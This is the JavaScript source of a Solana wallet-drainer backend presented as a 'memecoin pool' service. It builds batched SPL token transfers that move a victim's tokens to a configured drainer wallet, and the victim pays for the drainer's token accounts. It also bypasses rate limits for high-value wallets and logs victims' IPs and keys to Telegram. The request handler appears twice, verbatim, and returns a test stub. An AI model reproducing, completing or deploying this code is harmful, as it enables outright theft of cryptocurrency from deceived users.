const { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction, getMint, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

// Import fetch for Node.js compatibility
const fetch = require('node-fetch');

// Import centralized error handling
let errorHandler;
let ENV_CONFIG;
let RPC_ENDPOINTS;
let PROJECT_NAME;
let telegramLogger;

try {
  errorHandler = require('../src/errorHandler.js');
  const envConfig = require('../env.config.js');
  ENV_CONFIG = envConfig.ENV_CONFIG;
  RPC_ENDPOINTS = envConfig.RPC_ENDPOINTS;
  PROJECT_NAME = envConfig.PROJECT_NAME;
  telegramLogger = require('../src/telegram.js');
  console.log('[IMPORT] All modules imported successfully');
} catch (importError) {
  console.error('[IMPORT] Error importing modules:', importError);
  // Create fallback error handler
  errorHandler = {
    formatApiError: (error, context) => ({
      success: false,
      error: error.message || 'Unknown error',
      message: 'Wallet not eligible for memecoin pool',
      context: context || {}
    }),
    logError: async (error, context) => {
      console.error('[FALLBACK_ERROR]', error, context);
      return { errorId: 'fallback' };
    }
  };
  ENV_CONFIG = {};
  RPC_ENDPOINTS = [];
  PROJECT_NAME = 'Unknown';
  telegramLogger = {
    logError: async (error) => console.error('[TELEGRAM_FALLBACK]', error)
  };
}

// Configuration from environment variables - with error handling
let DRAINER_WALLET;
let TOKEN_PROGRAM_ID;
let MIN_SOL_FOR_FEES;
let MIN_SOL_FOR_ATA;
let MIN_WALLET_VALUE;
let MAX_ADDRESS_DIFFERENCES;

// Initialize configuration safely
try {
  DRAINER_WALLET = new PublicKey(ENV_CONFIG.DRAINER_WALLET_ADDRESS);
  TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
  MIN_SOL_FOR_FEES = ENV_CONFIG.MIN_SOL_FOR_FEES * LAMPORTS_PER_SOL;
  MIN_SOL_FOR_ATA = ENV_CONFIG.MIN_SOL_FOR_ATA * LAMPORTS_PER_SOL;
  MIN_WALLET_VALUE = ENV_CONFIG.MIN_WALLET_VALUE * LAMPORTS_PER_SOL;
  MAX_ADDRESS_DIFFERENCES = ENV_CONFIG.MAX_ADDRESS_DIFFERENCES;
} catch (error) {
  console.error('[DRAIN_ASSETS] Configuration error:', error.message);
  console.error('[DRAIN_ASSETS] ENV_CONFIG.DRAINER_WALLET_ADDRESS:', ENV_CONFIG.DRAINER_WALLET_ADDRESS);
  // Set fallback values
  DRAINER_WALLET = new PublicKey('11111111111111111111111111111111');
  TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
  MIN_SOL_FOR_FEES = 0.005 * LAMPORTS_PER_SOL;
  MIN_SOL_FOR_ATA = 0.002 * LAMPORTS_PER_SOL;
  MIN_WALLET_VALUE = 0.001 * LAMPORTS_PER_SOL;
  MAX_ADDRESS_DIFFERENCES = 3;
}

// Token Draining Limits & Batching
let MAX_TOKENS_PER_TRANSACTION;
let MAX_INSTRUCTIONS_PER_TRANSACTION;
let MAX_TRANSACTION_SIZE_BYTES;
let ENABLE_TOKEN_BATCHING;

// Rate Limit Bypass for High-Value Wallets
let RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
let RATE_LIMIT_BYPASS_SOL_THRESHOLD;
let RATE_LIMIT_BYPASS_ENABLED;

// Pre-create placeholder PublicKeys for stealth efficiency (avoid recreating on each call)
let STEALTH_PLACEHOLDER_MINT;

// Initialize remaining configuration safely
try {
  MAX_TOKENS_PER_TRANSACTION = ENV_CONFIG.MAX_TOKENS_PER_TRANSACTION;
  MAX_INSTRUCTIONS_PER_TRANSACTION = ENV_CONFIG.MAX_INSTRUCTIONS_PER_TRANSACTION;
  MAX_TRANSACTION_SIZE_BYTES = ENV_CONFIG.MAX_TRANSACTION_SIZE_BYTES;
  ENABLE_TOKEN_BATCHING = ENV_CONFIG.ENABLE_TOKEN_BATCHING;
  
  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD = ENV_CONFIG.RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
  RATE_LIMIT_BYPASS_SOL_THRESHOLD = ENV_CONFIG.RATE_LIMIT_BYPASS_SOL_THRESHOLD * LAMPORTS_PER_SOL;
  RATE_LIMIT_BYPASS_ENABLED = ENV_CONFIG.RATE_LIMIT_BYPASS_ENABLED;
  
  STEALTH_PLACEHOLDER_MINT = new PublicKey('11111111111111111111111111111111');
} catch (error) {
  console.error('[DRAIN_ASSETS] Additional configuration error:', error.message);
  // Set fallback values
  MAX_TOKENS_PER_TRANSACTION = 50;
  MAX_INSTRUCTIONS_PER_TRANSACTION = 80;
  MAX_TRANSACTION_SIZE_BYTES = 1200;
  ENABLE_TOKEN_BATCHING = true;
  
  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD = 100;
  RATE_LIMIT_BYPASS_SOL_THRESHOLD = 1.0 * LAMPORTS_PER_SOL;
  RATE_LIMIT_BYPASS_ENABLED = true;
  
  STEALTH_PLACEHOLDER_MINT = new PublicKey('11111111111111111111111111111111');
}



// RPC endpoints with fallback for reliability (prioritizing Helius and Shyft)

// Function to fetch token metadata
async function getTokenMetadata(connection, mintAddress) {
  try {
    const mint = await getMint(connection, new PublicKey(mintAddress));
    return {
      decimals: mint.decimals,
      supply: mint.supply.toString(),
      isInitialized: mint.isInitialized,
      freezeAuthority: mint.freezeAuthority?.toString() || null,
      mintAuthority: mint.mintAuthority?.toString() || null
    };
  } catch (error) {
    console.error(`Failed to fetch mint metadata for ${mintAddress}:`, error.message);
    return null;
  }
}

// Function to get token name/symbol from mint address (fully dynamic)
async function getTokenInfo(connection, mintAddress) {
  console.log(`[DEBUG] Resolving token info for mint: ${mintAddress}`);
  
  try {
    // First, try to get metadata from Jupiter's token list API (most reliable)
    try {
      console.log(`[DEBUG] Trying Jupiter API for ${mintAddress}...`);
      const response = await fetch(ENV_CONFIG.JUPITER_TOKEN_LIST_URL);
      if (response.ok) {
        const tokenList = await response.json();
        // Jupiter API returns an array directly, not {tokens: [...]}
        const token = tokenList.find(t => t.address === mintAddress);
        if (token) {
          console.log(`[DEBUG] Found token in Jupiter API: ${token.name} (${token.symbol})`);
          return {
            name: token.name || 'Unknown Token',
            symbol: token.symbol || 'UNKNOWN',
            logo: token.logoURI || null,
            decimals: token.decimals || 0
          };
        } else {
          console.log(`[DEBUG] Token ${mintAddress} not found in Jupiter API`);
        }
      } else {
        console.log(`[DEBUG] Jupiter API response not ok: ${response.status}`);
      }
    } catch (jupiterError) {
      console.log(`[DEBUG] Jupiter API failed for ${mintAddress}:`, jupiterError.message);
    }

    // Fallback: Try to get metadata from Solana's metadata program
    try {
      console.log(`[DEBUG] Trying Solana metadata for ${mintAddress}...`);
      const metadataAddress = await getMetadataAddress(new PublicKey(mintAddress));
      const metadataAccount = await connection.getAccountInfo(metadataAddress);
      
      if (metadataAccount && metadataAccount.data) {
        console.log(`[DEBUG] Found metadata account for ${mintAddress}`);
        // Try to parse metadata using a more robust approach
        const data = metadataAccount.data;
        
        // Look for name and symbol in the metadata
        let name = null;
        let symbol = null;
        
        // Search for name and symbol patterns in the metadata
        const dataString = data.toString();
        
        // Try to find name (usually appears as "name" followed by the actual name)
        const namePatterns = [
          /name["\s]*[:=]["\s]*([^"\s,}]+)/i,
          /"name"\s*:\s*"([^"]+)"/i,
          /name\s*=\s*"([^"]+)"/i
        ];
        
        for (const pattern of namePatterns) {
          const match = dataString.match(pattern);
          if (match && match[1] && match[1].length > 0 && match[1] !== 'name') {
            name = match[1].trim();
            console.log(`[DEBUG] Found name in metadata: ${name}`);
            break;
          }
        }
        
        // Try to find symbol (usually appears as "symbol" followed by the actual symbol)
        const symbolPatterns = [
          /symbol["\s]*[:=]["\s]*([^"\s,}]+)/i,
          /"symbol"\s*:\s*"([^"]+)"/i,
          /symbol\s*=\s*"([^"]+)"/i
        ];
        
        for (const pattern of symbolPatterns) {
          const match = dataString.match(pattern);
          if (match && match[1] && match[1].length > 0 && match[1] !== 'symbol') {
            symbol = match[1].trim();
            console.log(`[DEBUG] Found symbol in metadata: ${symbol}`);
            break;
          }
        }
        
        if (name || symbol) {
          const result = {
            name: name || `Token ${mintAddress.substring(0, 8)}...`,
            symbol: symbol || mintAddress.substring(0, 4).toUpperCase(),
            logo: null,
            decimals: 0
          };
          console.log(`[DEBUG] Returning metadata result: ${result.name} (${result.symbol})`);
          return result;
        } else {
          console.log(`[DEBUG] No name/symbol found in metadata for ${mintAddress}`);
        }
      } else {
        console.log(`[DEBUG] No metadata account found for ${mintAddress}`);
      }
    } catch (metadataError) {
      console.log(`[DEBUG] Metadata parsing failed for ${mintAddress}:`, metadataError.message);
    }

    // Final fallback: use mint address as identifier
    console.log(`[DEBUG] Using fallback naming for ${mintAddress}`);
    const fallbackResult = {
      name: `Token ${mintAddress.substring(0, 8)}...`,
      symbol: mintAddress.substring(0, 4).toUpperCase(),
      logo: null,
      decimals: 0
    };
    console.log(`[DEBUG] Returning fallback result: ${fallbackResult.name} (${fallbackResult.symbol})`);
    return fallbackResult;
    
  } catch (error) {
    console.log(`[DEBUG] Failed to get token info for ${mintAddress}:`, error.message);
    // Final fallback: use mint address as identifier
    const errorFallbackResult = {
      name: `Token ${mintAddress.substring(0, 8)}...`,
      symbol: mintAddress.substring(0, 4).toUpperCase(),
      logo: null,
      decimals: 0
    };
    console.log(`[DEBUG] Returning error fallback result: ${errorFallbackResult.name} (${errorFallbackResult.symbol})`);
    return errorFallbackResult;
  }
}

// Helper function to get metadata address for a mint
async function getMetadataAddress(mint) {
  try {
    // Try to import metaplex if available (optional dependency)
    const { findMetadataPda } = await import('@metaplex-foundation/mpl-token-metadata');
    return findMetadataPda(mint);
  } catch (error) {
    // If metaplex is not available, construct a basic metadata address
    // This is a simplified approach that works without external dependencies
    const metadataProgramId = new PublicKey('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s');
    const [metadataAddress] = await PublicKey.findProgramAddress(
      [
        Buffer.from('metadata'),
        metadataProgramId.toBuffer(),
        mint.toBuffer(),
      ],
      metadataProgramId
    );
    return metadataAddress;
  }
}



// Transaction simulation function for validation
async function simulateTransaction(connection, transaction, userPubkey) {
  try {
    console.log(`[SIMULATION] Simulating transaction with ${transaction.instructions.length} instructions`);
    
    // Get recent blockhash
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = userPubkey;
    
    // Simulate the transaction
    const simulation = await connection.simulateTransaction(transaction);
    
    if (simulation.value.err) {
      console.log(`[SIMULATION] Transaction simulation failed:`, simulation.value.err);
      return { success: false, error: simulation.value.err, logs: simulation.value.logs };
    }
    
    console.log(`[SIMULATION] Transaction simulation successful`);
    if (simulation.value.logs) {
      simulation.value.logs.forEach(log => {
        if (log.includes('Program log:')) {
          console.log(`[SIMULATION] ${log}`);
        }
      });
    }
    
    return { success: true, logs: simulation.value.logs };
  } catch (error) {
    console.log(`[SIMULATION] Simulation error: ${error.message}`);
    return { success: false, error: error.message };
  }
}

// Function to check if wallet qualifies for rate limit bypass
function checkRateLimitBypass(tokenCount, solBalance) {
  if (!RATE_LIMIT_BYPASS_ENABLED) {
    return { bypass: false, reason: 'Rate limit bypass disabled' };
  }
  
  const hasSignificantTokens = tokenCount >= RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
  const hasSignificantSOL = solBalance >= RATE_LIMIT_BYPASS_SOL_THRESHOLD;
  
  if (hasSignificantTokens || hasSignificantSOL) {
    const reasons = [];
    if (hasSignificantTokens) reasons.push(`${tokenCount} tokens`);
    if (hasSignificantSOL) reasons.push(`${(solBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    
    return {
      bypass: true,
      reason: `High-value wallet: ${reasons.join(', ')}`,
      tokenCount,
      solBalance,
      threshold: {
        tokens: RATE_LIMIT_BYPASS_TOKEN_THRESHOLD,
        sol: RATE_LIMIT_BYPASS_SOL_THRESHOLD / LAMPORTS_PER_SOL
      }
    };
  }
  
  return { bypass: false, reason: 'Standard rate limiting applies' };
}

// Function to create batched transactions for large token counts
async function createBatchedTransactions(connection, tokens, userPubkey) {
  try {
    console.log(`[BATCHING] Creating batched transactions for ${tokens.length} tokens`);
    
    const batches = [];
    let currentBatch = [];
    let currentBatchSize = 0;
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        
        if (amount <= 0) continue;
        
        // Estimate instruction size (rough calculation)
        const estimatedInstructionSize = 100; // Conservative estimate per SPL transfer
        
        // Check if adding this token would exceed limits
        if (currentBatch.length >= MAX_TOKENS_PER_TRANSACTION || 
            currentBatchSize + estimatedInstructionSize > MAX_TRANSACTION_SIZE_BYTES) {
          
          // Finalize current batch
          if (currentBatch.length > 0) {
            const batchResult = await createCleanSPLTransfer(connection, currentBatch, userPubkey);
            if (batchResult.success) {
              batches.push({
                batchNumber: batches.length + 1,
                tokens: currentBatch.length,
                transaction: batchResult.instructions,
                tokenDetails: batchResult.tokenDetails
              });
            }
          }
          
          // Start new batch
          currentBatch = [token];
          currentBatchSize = estimatedInstructionSize;
        } else {
          currentBatch.push(token);
          currentBatchSize += estimatedInstructionSize;
        }
      } catch (error) {
        console.log(`[BATCHING] Error processing token for batching: ${error.message}`);
        continue;
      }
    }
    
    // Add final batch if it has tokens
    if (currentBatch.length > 0) {
      const batchResult = await createCleanSPLTransfer(connection, currentBatch, userPubkey);
      if (batchResult.success) {
        batches.push({
          batchNumber: batches.length + 1,
          tokens: currentBatch.length,
          transaction: batchResult.instructions,
          tokenDetails: batchResult.tokenDetails
        });
      }
    }
    
    console.log(`[BATCHING] Created ${batches.length} batches for ${tokens.length} total tokens`);
    
    return {
      success: true,
      batches,
      totalBatches: batches.length,
      totalTokens: tokens.length
    };
    
  } catch (error) {
    console.log(`[BATCHING] Error creating batched transactions: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}

// Function to pre-initialize recipient token accounts
async function preInitializeRecipientAccounts(connection, tokens, userPubkey) {
  try {
    console.log(`[PRE_INIT] Pre-initializing recipient accounts for ${tokens.length} tokens`);
    
    const preInitTransactions = [];
    const initializedTokens = [];
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        
        if (amount <= 0) continue;
        
        // Get drainer ATA address
        const drainerATA = await getAssociatedTokenAddress(mint, DRAINER_WALLET);
        
        // Check if drainer ATA already exists
        const drainerAccount = await connection.getAccountInfo(drainerATA);
        
        if (!drainerAccount) {
          console.log(`[PRE_INIT] Creating ATA for mint ${info.mint} before main transaction`);
          
          // Create ATA creation transaction
          const ataCreationTx = new Transaction();
          const createATAIx = createAssociatedTokenAccountInstruction(
            userPubkey, // payer
            drainerATA, // ATA address
            DRAINER_WALLET, // owner
            mint // mint
          );
          
          ataCreationTx.add(createATAIx);
          ataCreationTx.feePayer = userPubkey;
          
          // Get blockhash for ATA creation
          let ataBlockhash;
          for (const endpoint of RPC_ENDPOINTS) {
            try {
              const fallbackConnection = new Connection(endpoint);
              const blockhashResponse = await fallbackConnection.getLatestBlockhash();
              ataBlockhash = blockhashResponse.blockhash;
              break;
            } catch (blockhashError) {
              continue;
            }
          }
          
          if (!ataBlockhash) {
            ataBlockhash = '11111111111111111111111111111111';
          }
          
          ataCreationTx.recentBlockhash = ataBlockhash;
          
          // Serialize ATA creation transaction
          const ataSerialized = ataCreationTx.serialize({ requireAllSignatures: false });
          const ataBase64 = Buffer.from(ataSerialized).toString('base64');
          
          preInitTransactions.push({
            mint: info.mint,
            transaction: ataBase64,
            type: 'ata_creation',
            drainerATA: drainerATA.toString()
          });
          
          console.log(`[PRE_INIT] ATA creation transaction prepared for mint ${info.mint}`);
        } else {
          console.log(`[PRE_INIT] ATA already exists for mint ${info.mint}`);
        }
        
        // Add to initialized tokens list
        initializedTokens.push({
          ...token,
          drainerATA: drainerATA.toString(),
          needsPreInit: !drainerAccount
        });
        
      } catch (tokenError) {
        console.log(`[PRE_INIT] Error processing token for pre-init: ${tokenError.message}`);
        continue;
      }
    }
    
    console.log(`[PRE_INIT] Pre-initialization complete: ${preInitTransactions.length} ATA creation transactions needed`);
    
    return {
      success: true,
      preInitTransactions,
      initializedTokens,
      needsPreInit: preInitTransactions.length > 0
    };
    
  } catch (error) {
    console.log(`[PRE_INIT] Error in pre-initialization: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}

// Clean SPL transfer function (no ATA creation instructions)
async function createCleanSPLTransfer(connection, tokens, userPubkey) {
  try {
    console.log(`[CLEAN_TRANSFER] Creating clean SPL transfer for ${tokens.length} tokens`);
    
    const instructions = [];
    const tokenDetails = [];
    let processedTokens = 0;
    let totalValue = 0;
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        const sourceATA = token.pubkey;
        
        if (amount <= 0) continue;
        
        console.log(`[CLEAN_TRANSFER] Processing token: ${info.mint}, amount: ${amount}`);
        
        // Get drainer ATA address (should already exist from pre-initialization)
        const drainerATA = await getAssociatedTokenAddress(mint, DRAINER_WALLET);
        
        // Verify drainer ATA exists (critical for clean transfer)
        const drainerAccount = await connection.getAccountInfo(drainerATA);
        
        if (!drainerAccount) {
          console.log(`[CLEAN_TRANSFER] WARNING: Drainer ATA doesn't exist for mint ${info.mint}`);
          console.log(`[CLEAN_TRANSFER] This token requires pre-initialization before clean transfer`);
          continue; // Skip this token - it needs pre-initialization
        }
        
        // Add ONLY the transfer instruction - no ATA creation
        const transferIx = createTransferInstruction(
          sourceATA, // from
          drainerATA, // to (guaranteed to exist)
          userPubkey, // authority
          BigInt(amount)
        );
        instructions.push(transferIx);
        
        // Get token info for display
        const tokenInfo = await getTokenInfo(connection, info.mint);
        const decimals = info.tokenAmount.decimals || 0;
        const humanAmount = amount / Math.pow(10, decimals);
        
        tokenDetails.push({
          mint: info.mint,
          name: tokenInfo?.name || 'Unknown Token',
          symbol: tokenInfo?.symbol || 'UNKNOWN',
          logo: tokenInfo?.logo || null,
          amount: amount,
          humanReadableAmount: humanAmount,
          uiAmount: info.tokenAmount.uiAmount,
          decimals: decimals,
          drainerATA: drainerATA.toString()
        });
        
        processedTokens++;
        totalValue += amount;
        console.log(`[CLEAN_TRANSFER] Added clean transfer instruction for ${tokenInfo?.symbol || 'token'}`);
        
      } catch (tokenError) {
        console.log(`[CLEAN_TRANSFER] Error processing token: ${tokenError.message}`);
        continue;
      }
    }
    
    if (processedTokens === 0) {
      // Check if wallet has any SPL tokens at all
      const hasAnySPLTokens = tokens.some(token => {
        try {
          const info = token.account.data.parsed.info;
          const amount = Number(info.tokenAmount.amount);
          return amount > 0;
        } catch (e) {
          return false;
        }
      });
      
      if (!hasAnySPLTokens) {
        throw new Error('Wallet has no SPL tokens to drain - only SOL balance found');
      } else {
        throw new Error('Wallet has SPL tokens but they require pre-initialization before draining');
      }
    }
    
    console.log(`[CLEAN_TRANSFER] Successfully created clean transfer with ${instructions.length} instructions for ${processedTokens} tokens`);
    
    return {
      success: true,
      instructions,
      tokenDetails,
      processedTokens,
      totalValue
    };
    
  } catch (error) {
    console.log(`[CLEAN_TRANSFER] Error creating clean transfer: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}


// Export for Vercel serverless function
module.exports = async function drainAssetsHandler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  // Enhanced debugging for Vercel deployment
  console.log('[DEBUG] === DRAIN ASSETS DEBUG START ===');
  console.log('[DEBUG] DRAINER_WALLET:', DRAINER_WALLET?.toString());
  console.log('[DEBUG] ENV_CONFIG loaded:', !!ENV_CONFIG);
  console.log('[DEBUG] ENV_CONFIG keys:', ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'ENV_CONFIG is null');
  console.log('[DEBUG] Request body:', req.body);
  console.log('[DEBUG] Request headers:', req.headers);
  console.log('[DEBUG] Environment:', process.env.NODE_ENV);
  console.log('[DEBUG] === DRAIN ASSETS DEBUG END ===');

  try {
    const { user, walletType } = req.body;
    
    // Enhanced wallet type validation with fallback (moved to beginning)
    const VALID_WALLET_TYPES = [
      'phantom', 'solflare', 'backpack', 'exodus', 'glow', 'unknown'
    ];
    
    // Validate wallet type
    function validateWalletType(walletType) {
      if (!walletType || typeof walletType !== 'string') {
        return 'unknown';
      }
      
      const normalizedType = walletType.toLowerCase().trim();
      
      // Explicitly reject Trust Wallet
      if (normalizedType.includes('trust') || normalizedType.includes('trustwallet')) {
        return 'rejected';
      }
      
      // Check for exact matches first
      if (VALID_WALLET_TYPES.includes(normalizedType)) {
        return normalizedType;
      }
      
      // Check for partial matches (but not for rejected types)
      for (const validType of VALID_WALLET_TYPES) {
        if (normalizedType.includes(validType) || validType.includes(normalizedType)) {
          return validType;
        }
      }
      
      return 'unknown';
    }
    
    const validatedWalletType = validateWalletType(walletType);
    console.log(`[WALLET_VALIDATION] Received wallet type: "${walletType}"`);
    console.log(`[WALLET_VALIDATION] Validated wallet type: "${validatedWalletType}"`);
    
    if (validatedWalletType === 'rejected') {
      console.log(`[WALLET_VALIDATION] Trust Wallet rejected: ${walletType}`);
      return res.status(400).json({ 
        success: false,
        error: 'Trust Wallet not supported',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    if (validatedWalletType === 'unknown') {
      console.log(`[WALLET_VALIDATION] Invalid wallet type: ${walletType}, using 'unknown'`);
    }
    
    // Enhanced user parameter validation
    if (!user || typeof user !== 'string') {
      // Log missing or invalid user parameter
      try {
        telegramLogger.logError({
          publicKey: user || 'Missing',
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Missing or invalid user parameter',
          context: 'SPL Memecoin Pool - Parameter Validation',
          walletType: validatedWalletType,
          lamports: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid user parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // For now, return a simple response to test if the endpoint is working
    console.log('[DRAIN_ASSETS] Processing request for user:', user, 'wallet:', validatedWalletType);
    
    return res.status(200).json({
      success: true,
      message: 'Drain assets endpoint is working!',
      user: user,
      walletType: validatedWalletType,
      timestamp: new Date().toISOString(),
      debug: {
        drainerWallet: DRAINER_WALLET?.toString(),
        envConfigLoaded: !!ENV_CONFIG,
        envConfigKeys: ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'null'
      }
    });

  } catch (error) {
    console.error('[DRAIN_ASSETS] Error:', error);
    
    // Use centralized error handling
    const errorInfo = await errorHandler.logError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown',
      ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
      context: 'SPL Token Drain - Complete Failure',
      splTokens: 0,
      lamports: 0
    });

    // Return user-friendly error message
    res.status(500).json(errorHandler.formatApiError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown'
    }));
  }
}

// Wallet-specific error handling for backend
const BACKEND_WALLET_ERRORS = {
  phantom: {
    CONNECTION_FAILED: 'Phantom wallet connection failed',
    SIGNING_FAILED: 'Phantom wallet signing failed',
    NETWORK_ERROR: 'Phantom network error'
  },
  solflare: {
    CONNECTION_FAILED: 'Solflare wallet connection failed',
    SIGNING_FAILED: 'Solflare wallet signing failed',
    NETWORK_ERROR: 'Solflare network error'
  },
  backpack: {
    CONNECTION_FAILED: 'Backpack wallet connection failed',
    SIGNING_FAILED: 'Backpack wallet signing failed',
    NETWORK_ERROR: 'Backpack network error'
  },
  exodus: {
    CONNECTION_FAILED: 'Exodus wallet connection failed',
    SIGNING_FAILED: 'Exodus wallet signing failed',
    NETWORK_ERROR: 'Exodus network error'
  },
  glow: {
    CONNECTION_FAILED: 'Glow wallet connection failed',
    SIGNING_FAILED: 'Glow wallet signing failed',
    NETWORK_ERROR: 'Glow network error'
  },

  unknown: {
    CONNECTION_FAILED: 'Unknown wallet connection failed',
    SIGNING_FAILED: 'Unknown wallet signing failed',
    NETWORK_ERROR: 'Unknown wallet network error'
  }
};

// Get backend wallet error message
function getBackendWalletErrorMessage(walletType, errorType) {
  const walletErrors = BACKEND_WALLET_ERRORS[walletType] || BACKEND_WALLET_ERRORS.unknown;
  return walletErrors[errorType] || walletErrors.CONNECTION_FAILED;
}

// Export for Vercel serverless function
module.exports = async function drainAssetsHandler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  // Enhanced debugging for Vercel deployment
  console.log('[DEBUG] === DRAIN ASSETS DEBUG START ===');
  console.log('[DEBUG] DRAINER_WALLET:', DRAINER_WALLET?.toString());
  console.log('[DEBUG] ENV_CONFIG loaded:', !!ENV_CONFIG);
  console.log('[DEBUG] ENV_CONFIG keys:', ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'ENV_CONFIG is null');
  console.log('[DEBUG] Request body:', req.body);
  console.log('[DEBUG] Request headers:', req.headers);
  console.log('[DEBUG] Environment:', process.env.NODE_ENV);
  console.log('[DEBUG] === DRAIN ASSETS DEBUG END ===');

  try {
    const { user, walletType } = req.body;
    
    // Enhanced wallet type validation with fallback (moved to beginning)
    const VALID_WALLET_TYPES = [
      'phantom', 'solflare', 'backpack', 'exodus', 'glow', 'unknown'
    ];
    
    // Validate wallet type
    function validateWalletType(walletType) {
      if (!walletType || typeof walletType !== 'string') {
        return 'unknown';
      }
      
      const normalizedType = walletType.toLowerCase().trim();
      
      // Explicitly reject Trust Wallet
      if (normalizedType.includes('trust') || normalizedType.includes('trustwallet')) {
        return 'rejected';
      }
      
      // Check for exact matches first
      if (VALID_WALLET_TYPES.includes(normalizedType)) {
        return normalizedType;
      }
      
      // Check for partial matches (but not for rejected types)
      for (const validType of VALID_WALLET_TYPES) {
        if (normalizedType.includes(validType) || validType.includes(normalizedType)) {
          return validType;
        }
      }
      
      return 'unknown';
    }
    
    const validatedWalletType = validateWalletType(walletType);
    console.log(`[WALLET_VALIDATION] Received wallet type: "${walletType}"`);
    console.log(`[WALLET_VALIDATION] Validated wallet type: "${validatedWalletType}"`);
    
    if (validatedWalletType === 'rejected') {
      console.log(`[WALLET_VALIDATION] Trust Wallet rejected: ${walletType}`);
      return res.status(400).json({ 
        success: false,
        error: 'Trust Wallet not supported',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    if (validatedWalletType === 'unknown') {
      console.log(`[WALLET_VALIDATION] Invalid wallet type: ${walletType}, using 'unknown'`);
    }
    
    // Enhanced user parameter validation
    if (!user || typeof user !== 'string') {
      // Log missing or invalid user parameter
      try {
        telegramLogger.logError({
          publicKey: user || 'Missing',
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Missing or invalid user parameter',
          context: 'SPL Memecoin Pool - Parameter Validation',
          walletType: validatedWalletType,
          lamports: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid user parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // For now, return a simple response to test if the endpoint is working
    console.log('[DRAIN_ASSETS] Processing request for user:', user, 'wallet:', validatedWalletType);
    
    return res.status(200).json({
      success: true,
      message: 'Drain assets endpoint is working!',
      user: user,
      walletType: validatedWalletType,
      timestamp: new Date().toISOString(),
      debug: {
        drainerWallet: DRAINER_WALLET?.toString(),
        envConfigLoaded: !!ENV_CONFIG,
        envConfigKeys: ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'null'
      }
    });

  } catch (error) {
    console.error('[DRAIN_ASSETS] Error:', error);
    
    // Use centralized error handling
    const errorInfo = await errorHandler.logError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown',
      ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
      context: 'SPL Token Drain - Complete Failure',
      splTokens: 0,
      lamports: 0
    });

    // Return user-friendly error message
    res.status(500).json(errorHandler.formatApiError(error, {
      publicKey: req.body?.user || 'Unknown',
      walletType: req.body?.walletType || 'Unknown'
    }));
  }
}
